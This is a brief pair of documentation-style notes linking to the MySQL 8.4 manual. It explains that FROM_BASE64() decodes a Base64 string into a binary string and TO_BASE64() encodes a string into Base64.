-> [`FROM_BASE64()`](https://dev.mysql.com/doc/refman/8.4/en/string-functions.html#function_from-base64) takes a Base64-encoded string and returns the recorded results as a binary string.
-> [`TO_BASE64()`](https://dev.mysql.com/doc/refman/8.4/en/string-functions.html#function_to-base64) is a reverse operation: it takes a string to Base64-encoded form and returns the result.
